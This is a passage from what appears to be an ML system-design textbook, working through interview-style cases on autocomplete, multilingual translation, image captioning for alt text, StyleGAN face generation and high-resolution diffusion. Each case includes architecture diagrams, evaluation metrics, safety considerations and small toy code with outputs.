                cand = (lp + math.log(p), ctx + [w], out + [w])
                (done if w == END else nxt).append(cand)
        beams = sorted(nxt, key=lambda x: -x[0])[:beam]
    lp, _, out = max(done, key=lambda x: x[0])
    words = out[:-1]
    if block and BLOCK & set(words):          # never guess someone's pronoun
        return None, 0.0
    return words, math.exp(lp)                # shown only if probability >= threshold
```
Output:
```
1) Threshold sweep (global model only) - show a suggestion only if P(suggestion) >= threshold
   threshold | trigger rate | acceptance | chars saved | blocked by pronoun filter
        0.00 |        69.4% |      31.8% |       42.4% | 75
        0.05 |        59.8% |      36.9% |       42.4% | 75
        0.15 |        53.5% |      39.9% |       41.2% | 75
        0.30 |        43.8% |      47.3% |       39.7% | 75
        0.50 |        36.5% |      52.8% |       37.0% | 75

2) Personalisation for user 'sam' (always writes 'thanks for the heads up'), threshold 0.3
   global only        trigger 40.4%  acceptance 37.0%  chars saved 28.6%
   global + personal  trigger 39.8%  acceptance 37.2%  chars saved 31.1%
   prefix ['thanks','for'] -> global: ['your', 'help'] | sam's blend: ['the', 'heads', 'up']

3) Sensitive-word filter (never guess the pronoun of someone the writer mentions)
   prefix ['can','you','ask'] unfiltered -> ['her', 'to', 'join', 'the', 'call'] | filtered -> (nothing shown)
```
Raising the threshold trades coverage for precision — from 0.00 to 0.50, trigger rate falls from 69% to 37% while acceptance rises from 32% to 53% — and characters saved barely changes, because the suggestions removed were mostly wrong. The personal blend changes only the phrases that are this user's habit, and the filter turns 75 would-be pronoun guesses into silence.

### TL;DR
A small distilled LM under a ~100 ms budget; avoid requests on the client (trim, debounce, drop stale); beam search plus a confidence threshold, tuned on the trigger-vs-acceptance curve; blend a per-user table for personalisation; defend against memorisation and never guess people's attributes.

---

## 14.9 Case: machine translation service

> **The question (paraphrased).** Design a translation service for 100+ languages: people type or paste text, and web pages and documents are translated through an API. About 500M requests per day.

### Requirements (minutes 0–8)
**Recognition.** "This is **sequence-to-sequence** generation — an encoder reads the source sentence, a decoder writes the target ([§3.8](../03-transformers-and-embeddings/README.md); [ML §12.5](../../../ml/chapters/12-sequences-rnns-and-attention/README.md)). The hard questions are how many models for how many language pairs, how to get data for rare languages, and how to measure quality when many translations are correct."

**Success.**
- *Primary:* **human-judged quality per language pair**, measured with a professional protocol such as **MQM** (Multidimensional Quality Metrics: translators mark each error by type and severity; Freitag et al., 2021).
- *Automatic proxies:* **BLEU** (n-gram overlap with a reference translation; Papineni et al., 2002), **chrF** (character n-gram overlap, better for rich morphology) and **COMET** (a neural model trained to predict human quality judgements; Rei et al., 2020).
- *Guardrails:* critical errors — negation flipped, numbers or names changed, offensive output, gender stereotyping when the source is neutral.

**Latency.** Three regimes: interactive typing (~300 ms p90), web-page translation (hundreds of short segments, throughput-bound), documents (asynchronous minutes). **Scope:** text only; speech and image translation reuse the same core behind ASR or OCR.

### Approach: data and model (minutes 8–18)
- **Model: an encoder-decoder Transformer** (Vaswani et al., 2017 — the architecture was introduced for translation). The encoder builds a representation of the whole source; the decoder attends to it with cross-attention while generating.
- **One multilingual model, not one per pair.** 100 languages form 100 × 99 = **9,900 directed pairs** — far too many models to train and serve. A single model with a **target-language tag** at the start of the input ("<2es> …") translates between many languages and can even manage pairs it never saw together (*zero-shot*; Johnson et al., 2017). NLLB extended this to ~200 languages (NLLB Team, 2022). The cost is **capacity dilution** — high-resource pairs lose a little quality as languages are added (Conneau et al., 2020, call it the *curse of multilinguality*) — so the top pairs by traffic often get a dedicated or distilled model.
- **Tokenisation:** a shared **subword vocabulary** (BPE or SentencePiece; Sennrich et al., 2016; Kudo and Richardson, 2018) across all languages, so rare words split into known pieces. Check how many tokens each script needs — languages that fragment badly pay more latency and money for the same sentence ([§3.1](../03-transformers-and-embeddings/README.md)).
- **Data:** **parallel text** (the same content in two languages) from public-domain and licensed sources and **mined** pairs (find sentences with near-identical multilingual embeddings in web text). For low-resource languages, **back-translation** creates synthetic pairs: translate monolingual target-language text *back* into the source with a reverse model, then train on (synthetic source → real target) (Sennrich, Haddow and Birch, 2016). The target side stays human-written, which is what matters most for fluency.
- **Cleaning:** language-ID every sentence, drop misaligned pairs, remove boilerplate and machine-translated web text where detectable — training on your own model's output amplifies its errors.

### Architecture (minutes 18–30)
**Envelope:** 500M requests/day ≈ **5,800/s** average. Take ~40 tokens in and ~40 out per request and an encoder-decoder of ~600M parameters split evenly. A forward pass costs ~2 FLOPs per parameter per token, and each token only passes through its own half: the encoder reads 40 source tokens once, the decoder writes 40 target tokens for each of 4 beams — 2 × 0.3 × 10⁹ × (40 + 4 × 40) ≈ 1.2 × 10¹¹ FLOPs per request; 5,800/s × 1.2 × 10¹¹ ≈ 7 × 10¹⁴ FLOP/s — a few accelerators at full use, tens in practice once latency headroom, peaks and per-pair models are included.

```mermaid
flowchart LR
    C["Client or API caller"] --> LID["Language ID - trigram or small classifier"]
    LID --> SEG["Segment into sentences, protect URLs, names, glossary terms"]
    SEG --> CACHE{"Segment cache hit?"}
    CACHE -- "hit" --> JOIN["Reassemble, restore formatting"]
    CACHE -- "miss" --> ROUTE["Route by pair - dedicated model or multilingual"]
    ROUTE --> NMT["Batched encoder-decoder, beam search"]
    NMT --> QE{"Quality estimate above bar?"}
    QE -- "yes" --> JOIN
    QE -- "no" --> FLAG["Return with low-confidence flag, log for review"]
    JOIN --> C
```

- **Segment, then translate sentences.** Sentences are the unit the model was trained on; it also makes batching and caching possible. Formatting (HTML tags, markdown) is stripped into placeholders and restored afterwards; **do-not-translate spans** (URLs, code, product names, customer glossaries) become protected placeholders too.
- **Language identification** runs first, on character n-grams. Very short inputs ("ok", "hotel") are ambiguous — fall back to the interface language or ask.
- **Segment cache.** Popular strings (menu labels, boilerplate, top news headlines) repeat constantly. Key the cache on (normalised text, source, target, model version, glossary version) so a model upgrade never serves stale translations.
- **Quality estimation (QE):** a reference-free model scores each translation at serve time — used to flag low-confidence output, route hard segments to a larger model, or send them to human post-editing for paying customers.
- **Web pages** are throughput jobs: send hundreds of segments as one batch, translate the visible part first, stream the rest.

### Evaluation and the loop (minutes 30–38)
- Score **every language pair separately** on fixed test sets (e.g. FLORES-200 from the NLLB work) with chrF and COMET; averages hide a pair that regressed.
- **Human MQM evaluation** decides launches for top pairs and samples the long tail.
- **Targeted suites:** negation, numbers and units, named entities, gender (does "the doctor" become masculine when the source is neutral? — Stanovsky et al., 2019), formality.
- **Signals from users:** edits in the "suggest an improvement" box and copy-without-edit rates; treat them as noisy labels, never as automatic training data without review (they can be adversarial).

### Scaling and cost
Levers in order: segment cache (the toy shows hit rates of 61–81% under an assumed Zipf distribution — measure yours), batching by language pair, **distilled** pair-specific students for the top 20 pairs by traffic, quantisation, and routing only low-QE segments to the large model ([§11.14](../11-llm-serving-and-inference/README.md)). Long documents go to a cheaper asynchronous queue.

### Safety
Translation can **introduce** harm: a mistranslated medical or legal instruction, an insult produced from a neutral sentence, or a political term rendered with a loaded synonym. Add output toxicity checks when the source was not toxic, protect numbers and negation with automatic source-target consistency checks, and label machine translation as such. Content sent for translation is often confidential — no training on API customers' text by default ([§12.5](../12-safety-ethics-governance/README.md)).

### Failure modes
| Failure | Response |
|---|---|
| Wrong source language detected | Show the detected language with one-click override; low-margin detections use the UI language |
| Hallucinated sentence (output unrelated to input) | QE and length-ratio checks; retry with a different model; flag |
| New model regresses one pair | Per-pair gates; ship the model with per-pair routing so the old model keeps that pair |
| Cache serves translation from an old model | Model version is part of the cache key |

### Follow-ups (Q→A)
- **Q: "BLEU went up but users complain."** A: BLEU rewards word overlap with one reference. The toy scores a correct paraphrase 0.31 and a wrong-meaning sentence 0.29 — nearly the same. Check COMET and a human MQM sample; BLEU is a regression alarm, not a launch criterion.
- **Q: "Add a language with almost no parallel data."** A: Mine what exists, back-translate monolingual text, rely on transfer from related languages in the multilingual model, and evaluate with native speakers before launch.
- **Q: "Why not pivot through English?"** A: Two hops double the latency and compound errors (and lose information English does not mark, such as formality); direct multilingual models avoid both, but pivoting is a reasonable fallback for rare pairs.
- **Q: "Could an LLM replace the NMT model?"** A: For top languages, LLMs translate well and follow instructions (tone, glossary); they cost more per token and are weaker on low-resource languages. A router can send high-value document translation to an LLM and bulk traffic to NMT — evaluate both on the same per-pair suites.

### What separates levels, and variations
Mid-level describes an encoder-decoder with beam search; senior settles the one-model-vs-9,900 question, names back-translation and per-pair evaluation and sizes the cache; staff treats quality as per-pair contracts with gates, QE-based routing and glossary/formatting as product features. **Variations:** *speech-to-speech interpretation* (streaming ASR → translation that waits for enough context → TTS; latency vs accuracy is the whole design) and *app-string localisation* (short strings without context — add screenshots or developer notes as context and a human review queue).

### Toy: language ID, BLEU and a segment cache (`code/translation_toy.py`)
```python
def bleu(cand, refs, max_n=4):
    c = cand.lower().split()
    rs = [r.lower().split() for r in refs]
    logp = 0.0
    for n in range(1, max_n + 1):
        cn = ngrams(c, n)
        maxref = Counter()
        for r in rs:
            maxref |= ngrams(r, n)                    # clip by the max count in any reference
        match = sum(min(k, maxref[g]) for g, k in cn.items())
        total = max(1, sum(cn.values()))
        p = (match + (n > 1)) / (total + (n > 1))     # add-one smoothing for n > 1
        logp += math.log(max(p, 1e-9)) / max_n
    ref_len = min((len(r) for r in rs), key=lambda L: (abs(L - len(c)), L))
    bp = 1.0 if len(c) > ref_len else math.exp(1 - ref_len / max(1, len(c)))   # brevity penalty
    return bp * math.exp(logp)
```
Output:
```
1) Language ID (character trigrams)
   'we will send the report on friday'      -> en (margin 0.85)
   'enviaré el informe el viernes'          -> es (margin 0.92)
   'nous allons à la gare'                  -> fr (margin 0.70)
   'wir gehen in den park'                  -> de (margin 0.90)
   'hotel'                                  -> es (margin 0.46)  <- low margin: ask the user / use the UI language
   'ok'                                     -> es (margin 0.02)  <- low margin: ask the user / use the UI language

2) BLEU against one reference
   exact                       BLEU 1.000   'please send me the report before friday'
   correct paraphrase          BLEU 0.307   'could you email me the report by friday'
   wrong meaning, same words   BLEU 0.286   'please send the report to me after friday'
   word salad                  BLEU 0.263   'report the friday me send before please'
   add a 2nd human reference 'could you email the report to me by friday': paraphrase BLEU 0.481

3) Sentence cache under Zipf traffic (assumed Zipf s=1.1; 200k requests over 500k distinct segments)
   LRU capacity  1,000 segments -> hit rate 61.4%
   LRU capacity 10,000 segments -> hit rate 76.9%
   LRU capacity 50,000 segments -> hit rate 81.2%
```
"hotel" is spelled the same in all four languages, so detection is a guess and the margin says so. BLEU cannot separate a correct paraphrase (0.31) from a sentence that says *after* instead of *before* (0.29) or even word salad (0.26); a second reference helps (0.48) but never fixes it — hence COMET and humans. The cache curve flattens: the first thousand segments do most of the work.

### TL;DR
One multilingual encoder-decoder with language tags (plus distilled students for top pairs) instead of 9,900 models; shared subword vocabulary; back-translation for low-resource languages; segment, protect, cache and batch; evaluate per pair with chrF/COMET and human MQM, never BLEU alone; quality estimation flags what the model is unsure of.

---

## 14.10 Case: image captioning

> **The question (paraphrased).** A photo-sharing platform wants automatic captions — used as **alt text** for blind and low-vision users (read aloud by screen readers) and for search. 100M images are uploaded per day.

### Requirements (minutes 0–8)
**Recognition.** "This is **conditional text generation**: an image encoder turns pixels into vectors and a text decoder writes the caption while attending to them ([§10.8](../10-generative-models-beyond-text/README.md), [§4.12](../04-large-language-models/README.md)). The user is someone who *cannot see the image*, so a confident wrong caption is worse than a vague right one."

**Success.**
- *Primary:* **usefulness rated by screen-reader users** on a sample — does the caption tell them what matters in the photo?
- *Guardrails:* the **hallucination rate** (objects mentioned that are not there — measured with **CHAIR**, the share of mentioned objects absent from the image; Rohrbach et al., 2018), offensive or sensitive-attribute captions (target: none found in the red-team set), and caption availability when the post is viewed.

**Latency.** Captioning can run **asynchronously at upload** — the post is usually viewed seconds or minutes later. For posts viewed before the caption is ready, show "image" plus any text the uploader wrote, never block the post. **Scope:** one-sentence descriptions; faces of private people are *not* identified by name; text inside images is read by OCR (optical character recognition) as a separate signal.

### Approach: data and model (minutes 8–18)
- **Architecture history in one breath:** CNN encoder + LSTM decoder (*Show and Tell*, Vinyals et al., 2015) → decoder that **attends** to image regions at each word (*Show, Attend and Tell*, Xu et al., 2015) → Transformer encoders (**ViT**, which cuts the image into patches treated as tokens; Dosovitskiy et al., 2021) → today's pattern: a **frozen pretrained image encoder** (e.g. CLIP's, Radford et al., 2021) connected by a small trainable bridge to a **pretrained language model** (BLIP-2, Li et al., 2023). The bridge is cheap to train; both big parts are reused.
- **Data:** human-written captions (COCO Captions: ~120k images with five captions each; Chen et al., 2015) are clean but small and narrow. Web **alt-text pairs** (Conceptual Captions, Sharma et al., 2018; billions more in later datasets) are huge but noisy — many alt texts are file names or SEO keywords. Filter with an image-text similarity model, and **bootstrap**: caption the web images with your model, then let an image-text matching filter drop every pair — original alt text or synthetic caption — that it judges a mismatch (BLIP's *CapFilt*, Li et al., 2022).
- **Alt-text style is a fine-tuning target.** Accessibility guidelines prefer concise, concrete descriptions ("A golden retriever catching a frisbee on a lawn") over "an image of…". Fine-tune on captions written to that style guide ([§8.2](../08-prompting-vs-finetuning-vs-rag-and-llm-evaluation/README.md)).
- **Decoding:** beam search produces safe, generic captions; the fix for *hallucinated* content is not a decoding trick but **grounding**: rerank beam candidates by how well each mentioned object is supported by an object detector or an image-text score, as in the toy.

### Architecture (minutes 18–30)
**Envelope:** 100M images/day ≈ **1,160/s** average. Per image: an image encoder pass (a ViT-L-sized encoder, ~300M parameters over ~200 patch tokens: 2 × 3 × 10⁸ × 200 ≈ 1.2 × 10¹¹ FLOPs) plus ~30 generated tokens from a ~1B-parameter decoder (2 × 10⁹ × 30 ≈ 6 × 10¹⁰ FLOPs) ≈ 2 × 10¹¹ FLOPs; × 1,160/s ≈ 2 × 10¹⁴ FLOP/s — a small GPU pool, because the work is asynchronous and batches perfectly.

```mermaid
flowchart LR
    UP["Upload"] --> Q[["Caption queue"]]
    Q --> ENC["Image encoder - batched"]
    ENC --> DEC["Caption decoder - beam candidates"]
    ENC --> DET["Object detector and OCR"]
    DEC --> RR["Grounding rerank"]
    DET --> RR
    RR --> POL{"Policy - sensitive attributes, safety"}
    POL -- "pass" --> ST[("Caption store - model version, scores")]
    POL -- "rewrite or drop" --> ST
    ST --> SR["Screen reader and search index"]
    USR["Uploader edits caption"] -.-> ST
```

- **Queue at upload**, batch on GPUs, write the caption with its model version and scores. Re-captioning the back catalogue after a model upgrade is a planned batch job, priced like any other.
- **Grounding rerank:** the decoder proposes a few candidates; a detector's object list (and OCR text) scores them; captions mentioning objects the detector did not see lose. This cut CHAIR from 0.25 to 0.00 in the toy.
- **The policy step** enforces rules no model should decide: do not infer gender, race, age, religion, health or sexual orientation from appearance; do not name people; replace "man/woman" with "person" when the policy requires it; drop the caption if a safety classifier fires.
- **Uploader edits win.** The screen reader uses a human-written caption when one exists; edits become evaluation data.

### Evaluation and the loop (minutes 30–38)
- **Reference-based metrics:** BLEU, METEOR, **CIDEr** (n-gram agreement with several human references, weighted by TF-IDF so rare, informative words count more; Vedantam et al., 2015) and **SPICE** (compares the objects, attributes and relations in a scene graph; Anderson et al., 2016).
- **Reference-free:** **CLIPScore** (image-caption similarity from CLIP; Hessel et al., 2021) — useful at scale on your own traffic where no references exist.
- **Hallucination:** CHAIR on a labelled set.
- **Humans decide:** sessions with screen-reader users rate usefulness; these results tune the style guide and the policy.

### Scaling and cost
Asynchronous batching keeps GPUs full. Cheaper models caption low-traffic images; high-traffic posts can be re-captioned by a larger model. Skip near-duplicates (a perceptual hash lookup) and reuse their captions.

### Safety
Captioning systems have a documented history of offensive labels on photos of people. Defences: the attribute policy above, a red-team set of people images across demographics, a safety classifier on captions, fast takedown, and a rule that "person" is always acceptable. If captions feed an LLM later (e.g. image Q&A), text *inside* images read by OCR is untrusted input — it can carry prompt injection ([§12.4](../12-safety-ethics-governance/README.md)).

### Failure modes
| Failure | Response |
|---|---|
| Caption not ready at first view | Show uploader text or "image"; caption fills in later |
| Hallucinated object | Grounding rerank; CHAIR regression gate; user report → eval set |
| Sensitive-attribute guess | Policy rewrite or drop; red-team gate on each model version |
| Model upgrade | Versioned captions; re-caption in background, keep old ones until replaced |

### Follow-ups (Q→A)
- **Q: "CIDEr went up but blind users rate captions worse."** A: CIDEr rewards agreeing with COCO-style references, not usefulness. Re-weight toward the human study and the alt-text style guide.
- **Q: "Use a big multimodal LLM instead?"** A: Its captions are richer and it can answer follow-up questions, but it costs more and hallucinates fluently. A cascade works: a small captioner for everything, the large model when a user asks for more detail.
- **Q: "How do you caption a screenshot of a document?"** A: Detect text-heavy images and switch to OCR plus a short summary; a scene caption ("a screenshot") helps nobody.
- **Q: "Can captions improve search?"** A: Yes — index caption text and image embeddings, but search should use the embedding directly and treat captions as one more field.

### What separates levels, and variations
Mid-level gives encoder + decoder + beam search; senior makes it asynchronous, measures hallucination and adds grounding; staff designs for the actual user (a screen-reader user who cannot check the caption), puts attribute policy outside the model and plans back-catalogue re-captioning. **Variations:** *video description* (caption keyframes, then summarise — see §14.14 for recaptioning training videos) and *product-photo attributes for e-commerce* (structured outputs — colour, material — validated against the catalogue).

### Toy: grounding rerank and CHAIR (`code/caption_toy.py`)
```python
def grounding_penalty(caption, detected):
    return sum(not supported(o, detected) for o in mentioned(caption))   # objects the detector did not see

def rerank(beams, detected, alpha=2.0):
    return max(beams, key=lambda b: b[1] - alpha * grounding_penalty(b[0], detected))
```
Output:
```
image | pick by model log-prob only            | pick after grounding rerank
img1  | a dog playing with a ball on the grass  | a dog jumping for a frisbee on the grass
img2  | a cat sitting on a sofa next to a laptop | a cat sleeping on a sofa
img3  | a man riding a bicycle down a street    | a man riding a bicycle down a street
img4  | a pizza on a plate with a cup of coffee | a pizza on a plate on a table
log-prob only     CHAIR_i 0.25 (hallucinated objects / objects)  CHAIR_s 0.75 (captions with one)  consensus 1.76
grounding rerank  CHAIR_i 0.00 (hallucinated objects / objects)  CHAIR_s 0.00 (captions with one)  consensus 3.62

alt-text policy (do not infer gender from appearance):
  model: 'a man riding a bicycle down a street'
  shown: 'a person riding a bicycle down a street'
```
The most probable captions invent a ball, a laptop (detector confidence 0.35) and a cup of coffee — three of four captions contain a hallucination. The reranker picks candidates the detector supports, and the consensus score (CIDEr-style) roughly doubles. The policy step rewrites a gender guess the model made from appearance.

### TL;DR
Frozen image encoder + bridge + language model, trained on clean human captions plus filtered web alt text; caption asynchronously at upload; rerank for grounding and measure hallucination with CHAIR; CIDEr/SPICE/CLIPScore for regressions but screen-reader users decide; the attribute policy lives outside the model.

---

## 14.11 Case: realistic face generation with GANs

> **The question (paraphrased).** A stock-media company wants photorealistic portraits of **people who do not exist** — for ads, game avatars and as privacy-safe test data. Customers browse and filter thousands of faces, and new ones are generated on demand. Design the generator and the service.

### Requirements (minutes 0–8)
**Recognition.** "This is **unconditional image generation** in one narrow domain — faces — where a **GAN** (generative adversarial network, [§10.3](../10-generative-models-beyond-text/README.md)) is still a strong choice: one forward pass per image, very sharp output and a smooth latent space you can steer. The two promises that matter are *realistic* and *not a real person*."

**Success.**
- *Primary:* **realism judged by people** — in a blind test, raters cannot reliably tell generated faces from real photos at the delivered resolution — tracked day to day with **FID** (Fréchet Inception Distance: the distance between feature statistics of real and generated images; lower is better; Heusel et al., 2017; [§10.9](../10-generative-models-beyond-text/README.md)).
- *Diversity:* coverage of ages, skin tones, hairstyles, accessories — measured with attribute classifiers and **precision/recall for generative models** (precision = share of samples that look real, recall = share of the real variety the model can produce; Kynkäänniemi et al., 2019).
- *Binding guardrail:* **no memorised identities** — no output may be a near-copy of a training face.

**Latency.** Generation takes tens of milliseconds on a GPU, so on-demand is easy; browsing can come from a pre-generated, pre-screened pool. **Scope:** 1024 × 1024 portraits, controllable attributes (age, expression, pose); no generation of specific real people.

### Approach: data and model (minutes 8–18)
- **Data:** high-quality, **consented and licensed** portraits, aligned so eyes and mouth fall at fixed positions (alignment makes the task much easier). Research used FFHQ — 70,000 Flickr faces at 1024² (Karras et al., 2019) — but a commercial product needs model-release consent from every photographed person, which is a legal requirement, not a nicety. Balance the dataset by attribute and **deduplicate identities**, because repeated identities are the ones a model memorises.
- **Model family: StyleGAN** (Karras et al., 2019; StyleGAN2, 2020). Its ideas in plain words:
  - A **mapping network** turns random noise *z* into an intermediate code *w* whose directions are more *disentangled* — one direction tends to change age, another pose.
  - The generator starts from a learned constant and injects *w* as a **style** at every resolution: coarse layers control pose and face shape, middle layers features such as hairstyle and eyes, fine layers mainly the colour scheme and micro-detail.
  - Per-pixel **noise inputs** add random fine detail (freckles, hair placement) without changing identity.
  - Training grew resolution step by step in the earlier **Progressive GAN** (Karras et al., 2018); StyleGAN2 replaced that with other architectural fixes.
- **Training loop:** the discriminator learns to tell real from fake; the generator learns to fool it (Goodfellow et al., 2014). Stabilisers that matter: the non-saturating loss, **R1 regularisation** (penalise the discriminator's gradient on real images), an **exponential moving average** of generator weights used for sampling, and **adaptive discriminator augmentation** when data is limited (StyleGAN2-ADA, Karras et al., 2020).
- **Known failure: mode collapse** — the generator finds a few outputs that fool the discriminator and stops producing the rest (whole age groups can vanish). Watch coverage metrics during training, not the losses: GAN losses do not go down steadily the way a classifier's do.
- **The truncation trick** (Brock et al., 2019; used by StyleGAN): sample *w* closer to its average. Quality rises and diversity falls — a **product knob**, not a training choice.

### Architecture (minutes 18–30)
**Envelope:** 10M faces/day ≈ **116/s** × ~0.05 GPU-s each ≈ **6 busy GPUs** — cheap. The expensive parts are training (weeks of multi-GPU time) and the screening pipeline.

```mermaid
flowchart LR
    REQ["Customer filters - age, pose, expression"] --> LAT["Latent search - attribute directions in w space"]
    LAT --> GEN["StyleGAN generator - one forward pass"]
    GEN --> MEM{"Near-duplicate of a training identity?"}
    MEM -- "yes" --> DROP["Discard and log"]
    MEM -- "no" --> QA{"Artefact and quality check"}
    QA -- "fail" --> DROP
    QA -- "pass" --> MARK["Watermark plus content credentials"]
    MARK --> POOL[("Screened face pool plus CDN")]
    POOL --> REQ
```

- **Attribute control** comes from directions in *w* space: fit a simple classifier (e.g. "smiling vs not") on generated samples, and its normal vector becomes an edit direction. Customers get sliders without retraining.
- **Memorisation check:** embed each output with a face-recognition model (e.g. **ArcFace**, Deng et al., 2019) and search the nearest training identity; above a similarity threshold, discard. This makes "does not exist" a measured claim.
- **Artefact check:** GANs have typical failures — mismatched earrings, melted glasses, background blobs. A small classifier trained on rejected samples filters them.
- **Provenance:** an invisible watermark plus C2PA content credentials on every image ([§10.10](../10-generative-models-beyond-text/README.md)), so buyers and platforms can check that the face is synthetic.

### Evaluation and the loop (minutes 30–38)
- **FID on 50,000 samples** at fixed preprocessing, per checkpoint; pick checkpoints by FID *and* precision/recall, since FID alone mixes the two.
- **Attribute distribution** of generated faces vs the target distribution; a skew is a bias finding, not just a quality one.
- **Human realism tests** before each release; customer rejections and reports feed the artefact classifier.

### Scaling and cost
Serving is cheap; a pre-generated pool of a few million screened faces answers most browsing. Retraining cost dominates — reuse checkpoints and fine-tune for new styles (e.g. studio lighting) instead of training from scratch.

### Safety
Synthetic faces are the standard ingredient of **fake social-media profiles**. Mitigations: provenance on every image, rate limits and know-your-customer checks for bulk buyers, terms banning impersonation and fraud, and sharing detection signatures with platforms. Deliberately **not** offered: editing uploaded photos of real people (that is a deepfake product with different risks — [§12.7](../12-safety-ethics-governance/README.md)).

### Failure modes
| Failure | Response |
|---|---|
| Mode collapse during training | Coverage metrics alarm; roll back to the last good checkpoint; adjust augmentation or regularisation |
| Output resembles a training person | Identity near-duplicate filter; remove that identity and retrain or fine-tune |
| Demographic skew in outputs | Rebalance data or sample latents to hit a target attribute mix; report both |
| Artefacts in a delivered image | Customer report → artefact classifier training set; refund |

### Follow-ups (Q→A)
- **Q: "Why a GAN, not diffusion?"** A: For one narrow domain, a GAN gives one-pass generation (instead of tens of denoising steps — an order of magnitude or more cheaper per image) and a steerable latent space. Diffusion wins on diversity and text conditioning; if customers want "a nurse in her 60s, laughing, outdoors" as free text, switch to a diffusion model with face-specific fine-tuning.
- **Q: "Discriminator loss is flat — is training broken?"** A: Not necessarily — the loss measures a moving game, not quality. Track FID, precision/recall and sample grids over time.
- **Q: "How do you prove a face is not a real person?"** A: You can't prove it about everyone alive; you can show it is not close to anyone *in your training set* (the people it could have memorised), and label it synthetic.
- **Q: "A customer wants more variety."** A: Raise ψ (less truncation), sample latents stratified by attribute, and check recall — at the cost of more artefacts to filter.

### What separates levels, and variations
Mid-level explains generator vs discriminator; senior names StyleGAN's mapping network, mode collapse, FID with precision/recall and truncation as a product knob; staff turns "not a real person" and "consented data" into measured pipeline steps and prices the pre-generated pool. **Variations:** *synthetic training data for face-recognition testing* (diversity and label control matter more than beauty) and *game avatar generation* (stylised domain, fine-tune from the photoreal model).

### Toy: mode dropping, FD and truncation (`code/gan_faces_toy.py`)
Eight Gaussian modes on a ring stand in for eight kinds of face; a small GAN learns them on the CPU.

```python
ld = bce(D(x), torch.ones(256, 1)) + bce(D(fake.detach()), torch.zeros(256, 1))
od.zero_grad(); ld.backward(); od.step()
lg = bce(D(fake), torch.ones(256, 1))        # non-saturating generator loss
og.zero_grad(); lg.backward(); og.step()
...
s = G(psi * torch.randn(5000, 8)).numpy()    # truncation: sample closer to the average
```
Output:
```
step  | D loss | G loss | modes covered | high quality | FD (lower is better)
  250 |  1.130 |  0.976 |       8/8       |       13.0% | 0.0147
 1000 |  1.194 |  1.104 |       7/8       |       73.0% | 0.0487
 2000 |  1.250 |  0.960 |       7/8       |       87.4% | 0.0563
 4000 |  0.956 |  1.421 |       7/8       |       60.4% | 0.0659

Truncation trick at sampling time: z ~ psi * N(0, I)  (no retraining)
  psi  | modes covered | high quality | FD
  1.0  |       7/8       |       60.7% | 0.0643
  0.7  |       7/8       |       66.1% | 0.0540
  0.4  |       7/8       |       68.8% | 0.1194
  0.1  |       5/8       |       62.4% | 2.2917
```
Three lessons in one run. **The losses say nothing** about progress. **FD on raw points misleads**: at step 250 the samples are a blurry smear around the ring (only 13% are sharp) yet FD is lowest, because a smear has the right mean and covariance — real FID uses rich image features for this reason, and precision/recall is reported next to it. **Mode dropping is real**: one mode is lost by step 1,000 and never recovered. Truncation raises sharpness a little (61% → 69%) and then costs diversity (7 → 5 modes at ψ = 0.1).

### TL;DR
StyleGAN-style generator (mapping network, per-layer styles, noise) trained on consented, aligned, identity-deduplicated faces; watch coverage and FID with precision/recall, not losses; truncation is a quality-vs-diversity knob; a face-embedding near-duplicate filter makes "not a real person" measurable; provenance and customer controls against fake profiles.

---

## 14.12 Case: high-resolution image synthesis

> **The question (paraphrased).** Our image generator makes good 512 × 512 pictures. Customers want 2048 × 2048 for print and wallpapers — sharp in every detail — at a cost per image not much higher than today. Design the model pipeline.

### Requirements (minutes 0–8)
**Recognition.** "Cost grows much faster than pixel count, so the answer is **don't generate pixels directly**: compress the image into a smaller latent or token space, generate there, and decode — plus, possibly, a **cascade** that generates small and super-resolves. This is [§10.4–§10.5](../10-generative-models-beyond-text/README.md) with the arithmetic done out loud."

**Success.**
- *Primary:* **human preference at full resolution**, judged on crops (detail) and on the whole image (composition).
- *Automatic:* FID on downsampled images tracks overall realism but is **blind to fine detail**, so also compute it on random high-resolution crops (patch FID) and measure prompt alignment with CLIP score.
- *Guardrails:* **cost per image** (GPU-seconds) and high-resolution artefacts — repeated objects, duplicated heads, tiling seams.

**Latency.** Seconds to tens of seconds; a low-resolution preview can come first. **Scope:** text-to-image at up to 2048² and arbitrary aspect ratios; editing is out.

### Approach: data and model (minutes 8–18)
**The arithmetic that forces the design** (from the toy): a 1024² RGB image is 3.1M numbers. As a sequence of pixels it would be 1M tokens — about 10¹² attention pairs. A latent autoencoder with downsampling factor **f = 8** turns it into a 128 × 128 × 4 latent (65,536 numbers, **48× fewer**), and 2 × 2 patches make that 4,096 tokens. Doubling the side to 2048² multiplies tokens by 4 and attention pairs by **16**.

Three families, each from a primary paper:

| Approach | How it works | Strength | Weakness |
|---|---|---|---|
| **Latent diffusion** (Rombach et al., 2022) | An autoencoder compresses; diffusion denoises in latent space; the decoder restores pixels | One model; most compute where it matters | The autoencoder caps detail — its reconstructions set the ceiling |
| **Cascaded diffusion** (Ho et al., 2022; Imagen, Saharia et al., 2022) | A base model generates 64²; super-resolution diffusion models upscale 64 → 256 → 1024 | Each stage is small; the base sees 256× fewer pixels than one-shot 1024² | Errors compound; needs *noise-conditioning augmentation* so upscalers tolerate imperfect inputs |
| **Discrete tokens + transformer** (VQ-VAE, van den Oord et al., 2017; VQGAN, Esser et al., 2021) | A codebook turns patches into token IDs; a transformer generates tokens; the decoder paints pixels | Reuses LLM machinery | Many sequential steps; codebook quality limits fidelity |

**The recommendation to say out loud:** latent diffusion with a **diffusion transformer** backbone (DiT; Peebles and Xie, 2023) at 1024², plus a **latent upscaler** stage to 2048², trained on genuinely high-resolution images.

**Data for high resolution:**
- Filter the training set to images at or above the target resolution; upsampled low-resolution images teach blur.
- **Aspect-ratio bucketing** (group training images by shape instead of cropping everything square) and **conditioning on the original size and crop coordinates**, both used in SDXL (Podell et al., 2023), stop the model from learning that heads get cut off at the edge.
- Train the autoencoder carefully — a perceptual and adversarial loss keeps textures sharp — because every generated image passes through its decoder.

### Architecture (minutes 18–30)
```mermaid
flowchart LR
    P["Prompt"] --> TE["Text encoder"]
    TE --> BASE["Base latent diffusion at 1024 - DiT, 20-30 steps"]
    BASE --> PREV["Decode preview - user picks"]
    PREV --> UPS["Latent upscaler 1024 to 2048 - few steps, conditioned on base latent"]
    UPS --> DEC["Autoencoder decoder - tiled with overlap"]
    DEC --> GATE{"Safety and artefact gate"}
    GATE --> OUT[("Final 2048 image plus provenance")]
```

- **Generate at the resolution the model was trained on**, then upscale. Asking a 1024² model directly for 2048² tends to produce **repetition** (two heads, duplicated towers), because each region looks locally like a whole image to the network.
